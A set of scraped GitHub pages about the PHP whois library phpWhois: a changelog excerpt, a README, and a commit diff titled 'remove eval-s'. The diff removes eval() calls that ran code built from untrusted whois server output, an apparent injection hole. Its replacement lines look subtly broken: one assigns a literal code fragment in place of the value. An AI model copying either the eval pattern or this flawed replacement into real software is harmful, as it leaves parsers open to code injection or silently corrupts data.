* Removed a blank line preventing headers from being sent.

## 2003/04/25 David Saez david@ols.es

* added support for web based whois for .tc, .vg, .ms, .gs and .tf domains

## 2003/04/19 David Saez david@ols.es

* fixed problem with whois.crsnic.net which causes some domains like hotmail.com and yahoo.com not to resolve, thanx to asajith@users.sourceforge.net for reporting this issue, also some improvments have been made to help diagnose problems like that in the future

## 2003/04/11 David Saez david@ols.es

* added gtld handler for SRSPlus

## 2003/04/07 Mark Jeftovic markjr@easydns.com

* fix for missing checkdnsrr function in windows

## 2003/04/04 David Saez david@ols.es

* added handler for .fm

## 2003/03/30 David Saez david@ols.es

* recovered 'powered by phpWhois' logo
* added handlers for directnic and buydomains
* minor improvment to generic3.whois
* minor fixes to bripw.whois

## 2003/03/26 David Saez david@ols.es

* some improvments on generic3.whois
* added handler for ascio (com/org)

## 2003/03/22 David Saez david@ols.es

* referrer correction and normalization in some handlers
* removed unused handler cdnnet.whois

## 2003/03/22 Ross Golder rossigee@users.sourceforge.net

* Release 3.0.4 available now

## 2003/03/17 David Saez david@ols.es

* chnic.whois & nlnic.whois rewritten
* minor fix and improvment on generic3.whois
* added nameserver detection to dotregistrar.whois
* minor fix on info.whois
* fixed bripw.whois
* bulkregstercom.whois fixed and updated to common object model

## 2003/03/16 David Saez david@ols.es

* mxnic.whois updated to common object model
* recovered brnic.whois and added bripw.whois which was implemented over brnic.whois by mistake
* fixed netsol.whois

## 2003/03/12 Ross Golder rossigee@users.sourceforge.net

* Minor corrections and a note about coding style on HANDLERS

## 2003/03/07 David Saez david@ols.es

* added lacnic.whois
* added file HANDLERS
* minor fixes to README

## 2003/03/05 David Saez david@ols.es

* implemented krnic.whois
* minor improvments to generic3.whois

## 2003/03/04 David Saez david@ols.es

* improvments on ripe.whois
* implemented arin.whois and brnic.whois
* added ip's for testing on ipw.whois

## 2003/03/03 David Saez david@ols.es

* some fixes to ip whois
* some fixes to uknic.whois
* implemented ripe.whois
* improved code for html2text for web based whois

## 2003/02/26 David Saez david@ols.es

* common object model changes in some handlers
* removed warning in gtld.whois when domain does not exist
* core.whois fixed and updated to common object model
* added corenic .org handle to gtld.whois

## 2003/02/25 David Saez david@ols.es

* added interdomain .org handle
* interdomain.whois updated to common object model

## 2003/02/19 David Saez david@ols.es

* added dotregistrar .org handle
* some improvments to generic3.whois
* registercom.whois updated to common object model

## 2003/02/18 David Saez david@ols.es

* added dotster .org handle
* some improvments to generic3.whois
* dotster.whois & registercom.whois updated to common object model

## 2003/02/16 David Saez david@ols.es

* improved generic.whois, update all handlers that use it
* now it's possible to also query http based whois
* added .es handler (http)
* some improvments on generic3.whois
* enom.whois fixed and updated to common object model
* added enom .org handle to gtld.whois

## 2003/02/15 David Saez david@ols.es

* added generic3.whois with functions to parse whois output
* added disclaimer to generic.whois and generic2.whois
* opensrsnet.whois updated to common object model
* added mxnic.whois, thanx to torfinn@nome.no

## 2003/02/10 David Saez david@ols.es

* inwwcom.whois updated to common object model
* added inwwcom org handle to gtld.whois
* gtld.whois now can get the name of the org registrar
* minor fixes to generic2.whois

## 2003/02/09 Ross Golder ross@golder.org

* updated to do a 'whois-servers.net' DNS lookup to determine the tld whois server to query

David Saez david@ols.es

* netsol.whois & gtld.whois updated to common object model
* fixed some warnings in main.whois

## 2003/01/29 David Saez david@ols.es

* fixed nicse.whois and updated to common object model

## 2003/01/27 David Saez david@ols.es

* fixed nunames.whois and updated to common object model

## 2003/01/26 David Saez david@ols.es

* fixed lunic.whois and updated to common object model
* neulevel.whois changed to use generic2.whois
* some minor fixes on info.whois

## 2003/01/25 David Saez david@ols.es

* info.whois updated to common object model

## 2003/01/19 David Saez david@ols.es

* fixed denic.whois

## 2003/01/18 David Saez david@ols.es

* added nlnic.whois, thanx to Matthijs Koot koot@cyberwar.nl
* fixed some warnings on generic.whois
* fixed double processing on atnic.whois

## 2002/12/16 David Saez david@ols.es

* updated aunic.whois
* improved generic.whois & generic2.whois
* fixed uninitialized variable in utils.whois

## 2002/10/16 David Saez david@ols.es

* Updated uknic handler to new Nominet UK whois output
* Added handler for .biz
* Added support to ipw.whois for BRNIC, KRNIC, TWNIC and LACNIC
* Some handlers updated to new common object model
* Added generic.whois and generic2.whois with parse functions for two kinds of whois output commonly used

## 2002/10/11 Ross Golder ross@golder.org

* Merged in as many useful patches as possible (supplied by Mark)
* Re-indented the classes for clarity
* Attempted to add comments to as much code as possible

## 2001/02/28

* batch add of many updates
* uknic.whois updated by David Saez Padros
* added dotster and chnic for .ch and .li, also by David Saez Padros
* .at whois server now whois.nic.at

## 2000/12/12

* v2.3
* PHP4 BUG IS FIXED!!!! Very special thanks to all who submitted fixes, used one provided by Stephen Leavitt stephen\_j\_leavitt@hotmail.com as it was the easiest and backwards compatible to PHP3
* added Enom handler, also by Stephen Leavitt stephen\_j\_leavitt@hotmail.com
* changed .ca whois to whois.cira.ca, using same handler for now.

## 2000/08/14

* added brnic.whois country handler
* major revision of servers.whois, many adds (crossreferenced against geektools list at <http://www.geektools.com/dist/whoislist.gz>)
  \*dropped all ORSC TLD's, either their whois servers weren't working or it was clear there was no functioning registry if they were. (From here on in we stick to the IANA legacy root TLD's)

## 2000/08/07

* v2.2-3
* gtld.whois, "TUCOWS.COM INC." now, "TUCOWS.COM, INC." an unannounced change by the NSI registry once again breaks scripts all over the world...(thanks to Fred Andrews fandrews@Technologist.com for the report and fix on this)
* servers.whois, added .ke Kenyan whois server, thanks to "Peter Anampiu" Anampiu@4bil.net for digging that up.:x

## 2000/05/27

* v2.2-2 ouch! params in implode() are backwards

## 2000/04/06

* v2.2-1 new classes for bulkregister, openSRS and melbourneIT by Jeremiah Bellomy jeremiah@emphasys.net

## 2000/03/16

* v2.1-4 servers.whois, added .st

## 2000/03/08

* v2.1-4 servers.whois, fixed .no address, added .as

## 2000/01/26

* v2.1-4
* **main.whois** -fixed Connect() so it wouldn't attempt to connect to an unset server (Query["server"] is null on pass 2 if domain isn't in the registry whois)
* added rudimentry "not found" code to sample script

## 2000/01/02

* v2.1-3
* **main.whois** - fixed GetTld() so "churchuk.com" 's tld wouldn't mistakenly be set to nominet's "uk.com" tld.
* fixed Lookup() was always using char by char reads regardless of $this->BUFFER value
* **servers.whois** - added nominet's se.com, se.net and no.com

## 2000/01/01

* 2.1-2
* **main.whois** - fixed Process() so it would only include the handler if it wasn't already defined. Trying queries inside a loop would fail on the second iteration.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_21bb487a_20250125_044242.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGemorroj%2Fphpwhois%2Fcommit%2F91c937e03c876ba1290b6de2a3ad953d2105fdd0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGemorroj%2Fphpwhois%2Fcommit%2F91c937e03c876ba1290b6de2a3ad953d2105fdd0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=Gemorroj%2Fphpwhois)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Gemorroj](/Gemorroj)
/
**[phpwhois](/Gemorroj/phpwhois)**
Public

forked from [SimpleUpdates/phpwhois](/SimpleUpdates/phpwhois)

* [Notifications](/login?return_to=%2FGemorroj%2Fphpwhois) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2FGemorroj%2Fphpwhois)
* [Star
   3](/login?return_to=%2FGemorroj%2Fphpwhois)

* [Code](/Gemorroj/phpwhois)
* [Issues
  0](/Gemorroj/phpwhois/issues)
* [Pull requests
  0](/Gemorroj/phpwhois/pulls)
* [Actions](/Gemorroj/phpwhois/actions)
* [Security](/Gemorroj/phpwhois/security)
* [Insights](/Gemorroj/phpwhois/pulse)

Additional navigation options

* [Code](/Gemorroj/phpwhois)
* [Issues](/Gemorroj/phpwhois/issues)
* [Pull requests](/Gemorroj/phpwhois/pulls)
* [Actions](/Gemorroj/phpwhois/actions)
* [Security](/Gemorroj/phpwhois/security)
* [Insights](/Gemorroj/phpwhois/pulse)

## Commit

[Permalink](/Gemorroj/phpwhois/commit/91c937e03c876ba1290b6de2a3ad953d2105fdd0)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

remove eval-s

[Browse files](/Gemorroj/phpwhois/tree/91c937e03c876ba1290b6de2a3ad953d2105fdd0)
Browse the repository at this point in the history

* Loading branch information

[![@Gemorroj](https://avatars.githubusercontent.com/u/885731?s=40&v=4)](/Gemorroj)

[Gemorroj](/Gemorroj/phpwhois/commits?author=Gemorroj "View all commits by Gemorroj")
committed
Feb 10, 2018

1 parent
[8f8d438](/Gemorroj/phpwhois/commit/8f8d43879d8761181237418f1f888d2b162b8e6d)

commit 91c937e

Showing
**1 changed file**
with
**15 additions**
and
**9 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

24 changes: 15 additions & 9 deletions

24
[src/whois.parser.php](#diff-e9edb00977138a21fba8c803b562e2c6b05b912b40a9f028e1d994f847f6decc "src/whois.parser.php")

Show comments

[View file](/Gemorroj/phpwhois/blob/91c937e03c876ba1290b6de2a3ad953d2105fdd0/src/whois.parser.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -102,10 +102,12 @@ function generic\_parser\_a\_blocks($rawdata, $translate, &$disclaimer) |
|  |  | $k = $translate[$k]; |
|  |  | if ($k == '') continue; |
|  |  | if (strstr($k, '.')) { |
|  |  | eval("\$block" . getvarname($k) . "=\$v;"); |
|  |  | ${'block' . getvarname($k)} = $v; |
|  |  | continue; |
|  |  | } |
|  |  | } else $k = strtolower($k); |
|  |  | } else { |
|  |  | $k = strtolower($k); |
|  |  | } |
|  |  |  |
|  |  | if ($k == 'handle') { |
|  |  | $v = strtok($v, ' '); |
| Expand Down  Expand Up | | @@ -345,15 +347,16 @@ function generic\_parser\_b($rawdata, $items = false, $dateformat = 'mdy', $hasreg |
|  |  |  |
|  |  | if ($pos !== false) { |
|  |  | if ($field != '') { |
|  |  | $var = '$r' . getvarname($field); |
|  |  | $itm = trim(substr($val, $pos + strlen($match))); |
|  |  |  |
|  |  | if ($itm != '') |
|  |  | eval($var . '="' . str\_replace('"', '\"', $itm) . '";'); |
|  |  | if ($itm != '') { |
|  |  | ${'r' . getvarname($field)} = '="' . str\_replace('"', '\"', $itm) . '";'; |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | if (!$scanall) |
|  |  | if (!$scanall) { |
|  |  | break; |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -418,7 +421,8 @@ function get\_blocks($rawdata, $items, $partial\_match = false, $def\_block = false |
|  |  | } else { |
|  |  | $var = getvarname(strtok($field, '#')); |
|  |  | $itm = trim(substr($val, $pos + strlen($match))); |
|  |  | eval('$r' . $var . '=$itm;'); |
|  |  |  |
|  |  | ${'r' . $var} = $itm; |
|  |  | } |
|  |  |  |
|  |  | break; |
| Expand Down  Expand Up | | @@ -480,7 +484,9 @@ function get\_blocks($rawdata, $items, $partial\_match = false, $def\_block = false |
|  |  |  |
|  |  | if ($pos !== false) { |
|  |  | $var = getvarname(strtok($field, '#')); |
|  |  | if ($var != '[]') eval('$r' . $var . '=$block;'); |
|  |  | if ($var != '[]') { |
|  |  | ${'r' . $var} = $block; |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -586,7 +592,7 @@ function get\_contact($array, $extra\_items = '', $has\_org = false) |
|  |  | $itm = trim(substr($val, $pos + strlen($match))); |
|  |  |  |
|  |  | if ($field != '' && $itm != '') { |
|  |  | eval('$r' . getvarname($field) . '=$itm;'); |
|  |  | ${'r' . getvarname($field)} = $itm; |
|  |  | } |
|  |  |  |
|  |  | $val = trim(substr($val, 0, $pos)); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `91c937e`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGemorroj%2Fphpwhois%2Fcommit%2F91c937e03c876ba1290b6de2a3ad953d2105fdd0) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_6a00e1df_20250126_060209.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsparc%2FphpWhois.org)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsparc%2FphpWhois.org)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=sparc%2FphpWhois.org)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sparc](/sparc)
/
**[phpWhois.org](/sparc/phpWhois.org)**
Public

* [Notifications](/login?return_to=%2Fsparc%2FphpWhois.org) You must be signed in to change notification settings
* [Fork
  43](/login?return_to=%2Fsparc%2FphpWhois.org)
* [Star
   95](/login?return_to=%2Fsparc%2FphpWhois.org)

Original phpWhois soruces

[www.phpwhois.org](http://www.phpwhois.org "http://www.phpwhois.org")

### License

[GPL-2.0 license](/sparc/phpWhois.org/blob/master/License.md)

[95
stars](/sparc/phpWhois.org/stargazers) [43
forks](/sparc/phpWhois.org/forks) [Branches](/sparc/phpWhois.org/branches) [Tags](/sparc/phpWhois.org/tags) [Activity](/sparc/phpWhois.org/activity)
 [Star](/login?return_to=%2Fsparc%2FphpWhois.org)

 [Notifications](/login?return_to=%2Fsparc%2FphpWhois.org) You must be signed in to change notification settings

* [Code](/sparc/phpWhois.org)
* [Issues
  12](/sparc/phpWhois.org/issues)
* [Pull requests
  1](/sparc/phpWhois.org/pulls)
* [Actions](/sparc/phpWhois.org/actions)
* [Projects
  0](/sparc/phpWhois.org/projects)
* [Security](/sparc/phpWhois.org/security)
* [Insights](/sparc/phpWhois.org/pulse)

Additional navigation options

* [Code](/sparc/phpWhois.org)
* [Issues](/sparc/phpWhois.org/issues)
* [Pull requests](/sparc/phpWhois.org/pulls)
* [Actions](/sparc/phpWhois.org/actions)
* [Projects](/sparc/phpWhois.org/projects)
* [Security](/sparc/phpWhois.org/security)
* [Insights](/sparc/phpWhois.org/pulse)

# sparc/phpWhois.org

    master[Branches](/sparc/phpWhois.org/branches)[Tags](/sparc/phpWhois.org/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[644 Commits](/sparc/phpWhois.org/commits/master/) | | |
| [src](/sparc/phpWhois.org/tree/master/src "src") | | [src](/sparc/phpWhois.org/tree/master/src "src") |  |  |
| [Changes.md](/sparc/phpWhois.org/blob/master/Changes.md "Changes.md") | | [Changes.md](/sparc/phpWhois.org/blob/master/Changes.md "Changes.md") |  |  |
| [FAQ.md](/sparc/phpWhois.org/blob/master/FAQ.md "FAQ.md") | | [FAQ.md](/sparc/phpWhois.org/blob/master/FAQ.md "FAQ.md") |  |  |
| [Handlers.md](/sparc/phpWhois.org/blob/master/Handlers.md "Handlers.md") | | [Handlers.md](/sparc/phpWhois.org/blob/master/Handlers.md "Handlers.md") |  |  |
| [License.md](/sparc/phpWhois.org/blob/master/License.md "License.md") | | [License.md](/sparc/phpWhois.org/blob/master/License.md "License.md") |  |  |
| [README.md](/sparc/phpWhois.org/blob/master/README.md "README.md") | | [README.md](/sparc/phpWhois.org/blob/master/README.md "README.md") |  |  |
| [example.cli.php](/sparc/phpWhois.org/blob/master/example.cli.php "example.cli.php") | | [example.cli.php](/sparc/phpWhois.org/blob/master/example.cli.php "example.cli.php") |  |  |
| [example.html](/sparc/phpWhois.org/blob/master/example.html "example.html") | | [example.html](/sparc/phpWhois.org/blob/master/example.html "example.html") |  |  |
| [example.php](/sparc/phpWhois.org/blob/master/example.php "example.php") | | [example.php](/sparc/phpWhois.org/blob/master/example.php "example.php") |  |  |
| [handler.template.php](/sparc/phpWhois.org/blob/master/handler.template.php "handler.template.php") | | [handler.template.php](/sparc/phpWhois.org/blob/master/handler.template.php "handler.template.php") |  |  |
| [test.txt](/sparc/phpWhois.org/blob/master/test.txt "test.txt") | | [test.txt](/sparc/phpWhois.org/blob/master/test.txt "test.txt") |  |  |
| [testsuite.php](/sparc/phpWhois.org/blob/master/testsuite.php "testsuite.php") | | [testsuite.php](/sparc/phpWhois.org/blob/master/testsuite.php "testsuite.php") |  |  |
| [testsuite.txt](/sparc/phpWhois.org/blob/master/testsuite.txt "testsuite.txt") | | [testsuite.txt](/sparc/phpWhois.org/blob/master/testsuite.txt "testsuite.txt") |  |  |
| [whois.icon.png](/sparc/phpWhois.org/blob/master/whois.icon.png "whois.icon.png") | | [whois.icon.png](/sparc/phpWhois.org/blob/master/whois.icon.png "whois.icon.png") |  |  |
| View all files | | |

## Repository files navigation

* README
* GPL-2.0 license
# phpWhois - base class to do whois queries with PHP

This package contains a Whois (RFC954) library for PHP. It allows
a PHP program to create a Whois object, and obtain the output of
a whois query with the Lookup function.

The response is an array containing, at least, an element 'rawdata',
containing the raw output from the whois request.

In addition, if the domain belongs to a registrar for which a special
handler exists, the special handler will parse the output and make
additional elements available in the response. The keys of these
additional elements are described in the file HANDLERS.

It fully supports IDNA (internationalized) domains names as
defined in RFC3490, RFC3491, RFC3492 and RFC3454.

It also supports ip/AS whois queries which are very useful to trace
SPAM. You just only need to pass the doted quad ip address or the
AS (Autonomus System) handle instead of the domain name. Limited,
non-recursive support for Referral Whois (RFC 1714/2167) is also
provided.

### Requirements

phpWhois requires PHP 4.3.0 or better with OpenSSL support to
work properly. Without SSL support you will not be able to
query domains which do not have a whois server but that have
a https based whois. Also, you can run it in lower PHP versions
but without timeout control. phpWhois will not work with PHP
versions below 4.1.0

### Installation

Basically, untar the distribution somewhere outside your server's
document root and make sure the directory is listed in 'include\_path'
in your php.ini file, server configuration or in an .htaccess file.
If you want to test it using a web browser just copy example.php ,
example.html and whois.icon.png anywhere on your server's document
root and try it.

phpWhois is not a PHP aplication is a class that can be used in
applications. There is no need to make the installation folder
accesible to anyone but PHP, nevertheless you can install it inside
your server's document root if you like, it will work without
problems or security risks.

### Example usage

See example.php

```
include 'whois.main.php';

$whois = new Whois();
$query = 'example.com';
$result = $whois->Lookup($query,false);
echo '<pre>';
print_r($result);
echo '</pre>';
```

If you provide the domain name to query in UTF-8, then you
must use:

```
$result = $whois->Lookup($query);
```

If the query string is not in UTF-8 then it must be in
ISO-8859-1 or IDNA support will not work.

### What you can query

You can use phpWhois to query domain names, ip addresses and
other information like AS, i.e, both of the following examples
work:

```
$whois = new Whois();
$result = $whois->Lookup('example.com');

$whois = new Whois();
$result = $whois->Lookup('62.97.102.115');

$whois = new Whois();
$result = $whois->Lookup('AS220');
```

### Using special whois servers

Some registrars can give special access to registered whois gateways
in order to have more fine control against abusing the whois services.
The currently known whois services that offer special acccess are:

* ripe

  The new ripe whois server software support some special parameters
  that allow to pass the real client ip address. This feature is only
  available to registered gateways. If you are registered you can use
  this service when querying ripe ip addresses that way:

  ```
  $whois = new Whois();
  $whois->UseServer('uk', 'whois.ripe.net?-V{version},{ip} {query}');
  $result = $whois->Lookup('62.97.102.115');
  ```
* whois.isoc.org.il

  This server is also using the new ripe whois server software and
  thus works the same way. If you are registered you can use this service
  when querying .il domains that way:

  ```
  $whois = new Whois();
  $whois->UseServer('uk', 'whois.isoc.org.il?-V{version},{ip} {query}');
  $result = $whois->Lookup('example.co.uk');
  ```
* whois.nic.uk

  They offer what they call WHOIS2 (see <http://www.nominet.org.uk/go/whois2> )
  to registered users (usually Nominet members) with a higher amount of
  permited queries by hour. If you are registered you can use this service
  when querying .uk domains that way:

  ```
  $whois = new Whois();
  $whois->UseServer('uk', 'whois.nic.uk:1043?{hname} {ip} {query}');
  $result = $whois->Lookup('example.co.uk');
  ```

This new feature also allows you to use a different whois server than
the preconfigured or discovered one by just calling whois->UseServer
and passing the tld and the server and args to use for the named tld.
For example you could use another whois server for .au domains that
does not limit the number of requests (but provides no owner
information) using this:

```
$whois = new Whois();
$whois->UseServer('au', 'whois-check.ausregistry.net.au');
```

or:

```
$whois = new Whois();
$whois->UseServer('be', 'whois.tucows.com');
```

to avoid the restrictions imposed by the .be whois server

or:

```
$whois = new Whois();
$whois->UseServer('ip', 'whois.apnic.net');
```

to lookup an ip address at specific whois server (but loosing the
ability to get the results parsed by the appropiate handler)

UseServer can be called as many times as necessary. Please note that
if there is a handler for that domain it will also be called but
returned data from the whois server may be different than the data
expected by the handler, and thus results could be different.

### Getting results faster

If you just want to know if a domain is registered or not but do not
care about getting the real owner information you can set:

```
$whois->deep_whois = false;
```

this will tell phpWhois to just query one whois server. For .com, .net
and .tv domains and ip addresses this will prevent phpWhois to ask more
than one whois server, you will just know if the donmain is registered
or not and which is the registrar but not the owner information.

### UTF-8

PHPWhois will assume that all whois servers return UTF-8 encoded output,
if some whois server does not return UTF-8 data, you can include it in
the `NON_UTF8` array in whois.servers.php

### Notes

There is an extended class called "whois.utils.php" which contains a
debugging function called showObject(), if you showObject($result)
it will output the total layout of the returned object to the
web browser.

The latest version of the package and a demo script resides at
<http://phpwhois.sourceforge.net/>

There is also be an article describing the package on devshed.com
at <http://www.devshed.com/Server_Side/PHP/whois/>

### Support/Patches

If you're really stuck and can't figure something out, or you want
to contribute an extended class for one of the TLD's, send a PR
or open an issue on GitHub. One of the developers will get around
to applying or responding.
<https://github.com/sparc/phpWhois.org>

### Credits

* Mark Jeftovic markjr@easydns.com
* David Saez Padros david@ols.es
* Ross Golder ross@golder.org

## About

Original phpWhois soruces

[www.phpwhois.org](http://www.phpwhois.org "http://www.phpwhois.org")

### Resources

[Readme](#readme-ov-file)
### License

[GPL-2.0 license](#GPL-2.0-1-ov-file)

[Activity](/sparc/phpWhois.org/activity)
### Stars

[**95**
stars](/sparc/phpWhois.org/stargazers)
### Watchers

[**6**
watching](/sparc/phpWhois.org/watchers)
### Forks

[**43**
forks](/sparc/phpWhois.org/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fsparc%2FphpWhois.org&report=sparc+%28user%29)

## [Releases](/sparc/phpWhois.org/releases)

No releases published

## [Packages 0](/users/sparc/packages?repo_name=phpWhois.org)

No packages published

## [Contributors 6](/sparc/phpWhois.org/graphs/contributors)

## Languages

* [PHP
  99.5%](/sparc/phpWhois.org/search?l=php)
* [HTML
  0.5%](/sparc/phpWhois.org/search?l=html)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_928ffd46_20250125_044248.html ===

[Skip to content](#start-of-content)

## Navigation Menu
